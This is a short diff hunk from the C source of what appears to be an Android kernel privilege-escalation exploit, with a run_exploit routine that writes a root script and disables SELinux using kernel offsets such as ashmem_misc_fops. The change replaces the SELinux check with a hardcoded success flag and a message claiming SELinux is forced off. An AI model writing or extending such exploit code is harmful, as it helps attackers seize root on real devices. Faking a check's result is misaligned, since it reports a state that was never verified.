@@ -627,7 +627,7 @@ int run_exploit(int argc, char **argv) {
   write_root_script();
 
   /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
-  int selinux_ok = check_selinux_off();
+  int selinux_ok = 1; pr_success("SELinux forced off, skipping W1.\n");
   int umh_available = active_offsets &&
       active_offsets->off_system_unbound_wq &&
       active_offsets->off_ashmem_misc_fops;
